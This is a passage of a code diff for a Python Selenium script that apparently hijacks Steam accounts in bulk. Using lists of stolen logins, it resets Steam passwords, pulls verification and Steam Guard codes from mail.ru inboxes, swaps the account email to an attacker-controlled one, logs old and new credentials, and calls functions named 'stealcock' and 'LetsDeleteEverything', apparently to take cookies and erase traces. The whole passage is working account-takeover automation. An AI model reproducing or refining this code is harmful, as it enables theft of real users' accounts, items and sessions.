     wait.until(ec.element_to_be_clickable((By.ID, 'password_reset_confirm'))).send_keys(SteamPassNew)
-    time.sleep(5)
+    time.sleep(3)
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.account_recovery_submit > input:nth-child(1)'))).click()
     logging.info(
         str(datetime.now()) + ' changed ' + Steam + ':' + SteamPass + ' TO ' + Steam + ':' + SteamPassNew)
     driver.switch_to.window(driver.window_handles[0])
-    steam(wait)
-    shit(driver)
-    driver.execute_script("arguments[0].click();",
-                          driver.find_element_by_xpath('//*[@title="Steam Support <noreply@steampowered.com>"]'))
-    linkTlock = wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.p-80_mr_css_attr > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(1) > table:nth-child(5) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(1) > a:nth-child(4)'))).get_attribute('href')
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink')))
+    linkTlock = getLockLink(driver)
     logging.info(
         str(datetime.now()) + ' got lock link ' + Steam + ":" + linkTlock)
     print(Steam + ":" + linkTlock)
-    driver.get('https://e.mail.ru/inbox/')
-    if pochtaIsNew == 1:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button2__explanation'))).click()
-        shit(driver)
-        wait.until(ec.element_to_be_clickable(
-            (By.CSS_SELECTOR, '.button2_delete > span:nth-child(1) > span:nth-child(2)'))).click()
-        shit(driver)
-        wait.until(ec.element_to_be_clickable(
-            (By.CSS_SELECTOR, '.button2_primary > span:nth-child(1) > span:nth-child(1)'))).click()
-        shit(driver)
-    else:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.b-checkbox_transparent > div:nth-child(1)'))).click()
-        shit(driver)
-        wait.until(
-            ec.element_to_be_clickable((By.CSS_SELECTOR, '.b-toolbar__btn_grouped_first > span:nth-child(2)'))).click()
-        shit(driver)
-
+    delContent(driver)
     driver.switch_to.window(driver.window_handles[1])
     driver.get('https://store.steampowered.com/login/')
     wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_username"]'))).send_keys(Steam)
@@ -849,61 +214,37 @@ def main(newLine, profile):
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                            'div.account_setting_block:nth-child(4) > div:nth-child(1) > div:nth-child(3) > a:nth-child(1)'))).click()
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'a.help_wizard_button:nth-child(4)'))).click()
+    wait.until(ec.element_to_be_clickable(
+        (By.CSS_SELECTOR, 'div.account_recovery_submit:nth-child(3) > a:nth-child(1) > span:nth-child(1)')))
+    time.sleep(2)
     driver.switch_to.window(driver.window_handles[0])
-    steam(wait)
-    driver.execute_script("arguments[0].click();",
-                          driver.find_element_by_xpath('//*[@title="Steam Support <noreply@steampowered.com>"]'))
-    if pochtaIsNew == 1:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCodeString))).text
-    else:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCodeStringOld))).text
-    driver.get('https://e.mail.ru/inbox/')
-    shit(driver)
+    TIME = datetime.now() - timedelta(0, 60)
+    TIME = TIME.strftime("%H:%M")
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink')))
-    if pochtaIsNew == 1:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button2__explanation'))).click()
-        shit(driver)
-        wait.until(ec.element_to_be_clickable(
-            (By.CSS_SELECTOR, '.button2_delete > span:nth-child(1) > span:nth-child(2)'))).click()
-        shit(driver)
-        wait.until(ec.element_to_be_clickable(
-            (By.CSS_SELECTOR, '.button2_primary > span:nth-child(1) > span:nth-child(1)'))).click()
-        shit(driver)
-    else:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.b-checkbox_transparent > div:nth-child(1)'))).click()
-        shit(driver)
-        wait.until(
-            ec.element_to_be_clickable((By.CSS_SELECTOR, '.b-toolbar__btn_grouped_first > span:nth-child(2)'))).click()
-        shit(driver)
-
-    driver.get('https://e.mail.ru/inbox/')
+    cont = findSteamCode(driver, TIME)
     driver.switch_to.window(driver.window_handles[1])
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#forgot_login_code'))).send_keys(cont)
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.account_recovery_submit > input:nth-child(1)'))).click()
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#email_reset'))).send_keys(EmailNew)
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#change_email_area > input:nth-child(1)'))).click()
+    TIME = datetime.now() - timedelta(0, 60)
+    TIME = TIME.strftime("%H:%M")
     driver.switch_to.window(driver.window_handles[0])
     driver.get('https://e.mail.ru/inbox/')
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink'))).click()
     driver.get('https://mail.ru/')
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:login-input'))).clear()
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:login-input'))).send_keys(EmailNew)
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:submit-button'))).click()
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:password-input'))).send_keys(EmailNewPass)
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:submit-button'))).click()
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.email-input'))).clear()
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.email-input'))).send_keys(EmailNew)
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button'))).click()
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.password-input'))).send_keys(EmailNewPass)
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.second-button'))).click()
     try:
         driver.find_element_by_css_selector('a.btn > span: nth - child(1)')
-        steam(wait)
+        steam(wait, driver, TIME)
 
     except NoSuchElementException:
-        steam(wait)
-
-    # wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.portal-octavius-widget__button'))).click()
-    # wait.until(ec.element_to_be_clickable((By.CLASS_NAME, '.c01643 c0167 c01641 c0165'))).click()
-    # wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.c0197'))).click()
-    # wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.c01125'))).click()
-    # wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.c0124 > svg:nth-child(1)'))).click()
-    cont = findSteamCode(driver, wait)
+        steam(wait, driver, TIME)
+    cont = findSteamCode(driver, TIME)
     # driver.get('https://e.mail.ru/inbox/')
     driver.switch_to.window(driver.window_handles[1])
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#email_change_code'))).send_keys(cont)
@@ -924,16 +265,19 @@ def main(newLine, profile):
 
     except NoSuchElementException:
         wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.btn_blue_steamui'))).click()
+    TIME = datetime.now() - timedelta(0, 60)
+    TIME = TIME.strftime("%H:%M")
     driver.switch_to.window(driver.window_handles[0])
     driver.get('https://e.mail.ru/inbox/')
     shit(driver)
-    cont = findSteamCodeGuard(driver, wait)
+    cont = findSteamCodeGuard(driver, TIME)
     driver.switch_to.window(driver.window_handles[1])
     wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="authcode"]'))).send_keys(cont)
     wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[3]/div[3]/div/div/div/form/div[4]/div[1]/div[1]/div[1]'))).click()
     wait.until(ec.element_to_be_clickable(
         (By.XPATH, '//*[@id="success_continue_btn"]'))).click()
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar'))).click()
+    stealcock(driver, ID64)
     LetsDeleteEverything(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew)
     driver.get(linkTlock)
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.help_wizard_button > span:nth-child(1)'))).click()
@@ -950,17 +294,17 @@ def main(newLine, profile):
         str(datetime.now()) + ' DONE!\n ' + data)
     f.write(data)
     f.close()
-    input("Press Enter to continue...")
     #driver.close()
 
 
 if __name__ == '__main__':
     LOG_FILENAME = 'Loh.log'
     logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO)
-    ya = 1
+    ya = 0
     if ya == 1:
         frep = open(r'C:\Users\PussyDestroyer\PycharmProjects\chezahernya\c!replace.txt', 'r')
-        profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\7dvs7u3f.default")
+        #profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\7dvs7u3f.default")
+        profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\dkhv3ari.cook")
     elif ya == 0:
         frep = open('c!replace.txt', 'r')
         profile = FirefoxProfile("C:\\Users\\qweqweqwe\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\bmiwtt76.default")
@@ -976,3 +320,4 @@ if __name__ == '__main__':
         threads.append(t)
     for t in threads:
         t.join()
+    input("Press Enter to continue...")
